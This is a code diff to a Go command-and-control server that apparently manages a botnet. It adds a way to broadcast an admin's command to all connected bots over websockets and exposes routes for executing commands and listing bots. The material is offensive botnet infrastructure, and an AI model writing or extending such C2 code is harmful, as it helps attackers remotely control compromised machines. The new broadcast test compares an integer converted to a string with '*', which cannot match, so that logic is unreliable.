@@ -130,11 +130,22 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 	}
 	json.Unmarshal(body, &cmd)
 	// fmt.Println(cmd)
-	bot := c.getBot(cmd.BotID)
 
-	if err = wsjson.Write(context.Background(), bot.con, cmd.CmdType); err != nil {
-		log.Println(err)
-		return
+	if strconv.Itoa(cmd.BotID) == "*" {
+		for _, v := range c.bots {
+			if err = wsjson.Write(context.Background(), v.con, cmd.CmdType); err != nil {
+				log.Println(err)
+				continue
+			}
+			fmt.Println("Command send to bot : ", v.ID)
+		}
+	} else {
+		bot := c.getBot(cmd.BotID)
+		if err = wsjson.Write(context.Background(), bot.con, cmd.CmdType); err != nil {
+			log.Println(err)
+			return
+		}
+		fmt.Println("Command send to bot : ", bot.ID)
 	}
 
 } //send  execute command  message by admin
@@ -176,6 +187,7 @@ func main() {
 	var wg sync.WaitGroup
 	wg.Add(2)
 	c2 := Newc2()
+
 	adminMux := http.NewServeMux()
 	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
 	adminMux.HandleFunc("/listBots", c2.ListBots)
